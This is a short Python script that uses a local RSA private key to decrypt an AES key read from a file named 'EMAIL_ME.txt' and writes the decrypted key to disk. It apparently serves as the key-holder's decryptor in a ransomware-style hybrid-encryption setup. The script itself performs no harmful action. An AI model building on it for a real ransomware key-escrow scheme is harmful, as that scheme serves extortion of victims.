from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP


def rsaDecrypt(enc_message):
        key = RSA.importKey(open('privKey.pem').read())
        cipher = PKCS1_OAEP.new(key)
        message = cipher.decrypt(enc_message)

        return message
    
def read_enc_aeskey():
    with open('/home/ubuntu/Desktop/EMAIL_ME.txt', 'rb') as f:
        enc_aeskey = f.read()
        print(enc_aeskey)
    return enc_aeskey

def write_dec_aeskey(dec_aeskey):
    with open('/home/ubuntu/Desktop/dec_aesKey.txt', 'wb') as f:
        f.write(dec_aeskey)


if __name__ == "__main__":
    enc_aeskey = read_enc_aeskey()
    dec_aeskey = rsaDecrypt(enc_aeskey)
    write_dec_aeskey(dec_aeskey)
    
    print('> Decryption Completed')

